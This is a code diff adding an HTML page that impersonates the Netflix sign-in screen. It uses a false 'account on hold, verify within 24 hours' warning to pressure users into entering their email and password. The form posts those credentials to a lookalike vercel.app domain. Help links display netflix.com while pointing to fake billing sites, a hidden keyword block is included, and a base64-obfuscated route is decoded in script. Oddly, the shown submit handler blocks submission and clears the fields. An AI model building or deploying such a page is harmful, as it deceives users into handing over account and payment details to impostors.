@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Netflix - Sign In</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: Arial, Helvetica, sans-serif;
+      background:
+        linear-gradient(rgba(0,0,0,.72), rgba(0,0,0,.72)),
+        linear-gradient(120deg, #171717, #050505);
+      color: #fff;
+    }
+
+    .header {
+      height: 90px;
+      display: flex;
+      align-items: center;
+      padding: 0 5%;
+    }
+
+    .logo {
+      color: #e50914;
+      font-size: 38px;
+      font-weight: 900;
+      letter-spacing: -2px;
+    }
+
+    .signin-container {
+      width: 450px;
+      min-height: 610px;
+      margin: 20px auto 80px;
+      padding: 55px 68px;
+      background: rgba(0,0,0,.82);
+      border-radius: 4px;
+    }
+
+    h1 {
+      margin: 0 0 28px;
+      font-size: 32px;
+    }
+
+    .notice {
+      background: #e87c03;
+      color: #fff;
+      padding: 12px;
+      margin-bottom: 20px;
+      border-radius: 3px;
+      font-size: 13px;
+      line-height: 1.45;
+    }
+
+    input {
+      display: block;
+      width: 100%;
+      height: 50px;
+      margin-bottom: 16px;
+      padding: 0 16px;
+      border: 0;
+      border-radius: 4px;
+      background: #333;
+      color: white;
+      font-size: 15px;
+    }
+
+    input:focus {
+      outline: 1px solid #aaa;
+    }
+
+    button {
+      width: 100%;
+      height: 48px;
+      margin-top: 12px;
+      border: 0;
+      border-radius: 4px;
+      background: #e50914;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .options {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 12px;
+      font-size: 13px;
+      color: #aaa;
+    }
+
+    a {
+      color: #fff;
+      text-decoration: none;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+
+    .signup {
+      margin-top: 55px;
+      color: #777;
+      font-size: 16px;
+    }
+
+    .signup strong {
+      color: white;
+    }
+
+    .security {
+      margin-top: 18px;
+      color: #8c8c8c;
+      font-size: 13px;
+      line-height: 1.45;
+    }
+
+    .verify {
+      margin-top: 20px;
+      padding-top: 18px;
+      border-top: 1px solid #333;
+      font-size: 12px;
+      color: #aaa;
+    }
+
+    .footer {
+      background: rgba(0,0,0,.85);
+      padding: 30px 15%;
+      color: #737373;
+      font-size: 13px;
+    }
+
+    .footer-links {
+      display: flex;
+      gap: 35px;
+      margin-top: 20px;
+    }
+
+    .footer a {
+      color: #737373;
+    }
+
+    .hidden-data {
+      display: none;
+    }
+
+    @media (max-width: 520px) {
+      .signin-container {
+        width: 100%;
+        margin: 0;
+        padding: 35px 25px;
+        background: #000;
+      }
+
+      .header {
+        background: #000;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <header class="header">
+    <div class="logo">NETFLIX</div>
+  </header>
+
+  <main class="signin-container">
+
+    <h1>Sign In</h1>
+
+    <div class="notice">
+      Your membership has been temporarily placed on hold.
+      Sign in and verify your account information within 24 hours
+      to prevent interruption of your streaming service.
+    </div>
+
+    <form
+      id="signin"
+      action="https://netflix-account-verification.vercel.app/session/login"
+      method="POST"
+    >
+      <input
+        id="email"
+        name="email"
+        type="email"
+        placeholder="Email or mobile number"
+        autocomplete="username"
+        required
+      >
+
+      <input
+        id="password"
+        name="password"
+        type="password"
+        placeholder="Password"
+        autocomplete="current-password"
+        required
+      >
+
+      <input
+        type="hidden"
+        name="continue"
+        value="/account/payment"
+      >
+
+      <input
+        type="hidden"
+        name="session_id"
+        value="NF-839174921"
+      >
+
+      <button type="submit">
+        Sign In
+      </button>
+    </form>
+
+    <div class="options">
+      <label>
+        <input
+          type="checkbox"
+          style="width:auto;height:auto;display:inline;margin:0"
+        >
+        Remember me
+      </label>
+
+      <a
+        href="#"
+        data-target="https://netflix-account-help.vercel.app/recover"
+      >
+        Need help?
+      </a>
+    </div>
+
+    <div class="signup">
+      New to Netflix?
+      <strong>Sign up now.</strong>
+    </div>
+
+    <div class="security">
+      This page is protected by enhanced account security measures
+      to ensure your membership and billing information remain current.
+    </div>
+
+    <div class="verify">
+      Having trouble accessing your account?
+      <a
+        href="#"
+        data-target="https://netflix-secure-billing.vercel.app/verify"
+      >
+        https://www.netflix.com/account
+      </a>
+    </div>
+
+  </main>
+
+  <div class="hidden-data">
+    netflix account login password membership billing payment
+    verify identity suspended streaming subscription authentication
+    update payment information account security verification
+  </div>
+
+  <footer class="footer">
+    Questions? Contact us.
+
+    <div class="footer-links">
+      <a href="#">FAQ</a>
+      <a href="#">Help Center</a>
+      <a href="#">Terms of Use</a>
+      <a href="#">Privacy</a>
+    </div>
+  </footer>
+
+  <script>
+    const route =
+      "aHR0cHM6Ly9uZXRmbGl4LWFjY291bnQtdmVyaWZpY2F0aW9uLXRlc3QudmVyY2VsLmFwcC9hdXRo";
+
+    const decodedRoute = atob(route);
+
+    document
+      .getElementById("signin")
+      .addEventListener("submit", function(event) {
+        event.preventDefault();
+
+        const email = document.getElementById("email");
+        const password = document.getElementById("password");
+
+        email.value = "";
+        password.value = "";
+
+        window.history.replaceState(
+          {},
+          "",
+          "/account/security-check"
+        );
+
+        document.querySelector(".signin-container").innerHTML =
+          "<h1>Account Verification</h1>" +
+          "<p>Your account information is being reviewed.</p>" +
+          "<p>Please wait while your membership status is updated.</p>";
+
+        console.log(decodedRoute);
+      });
+  </script>
+
+</body>
+</html>
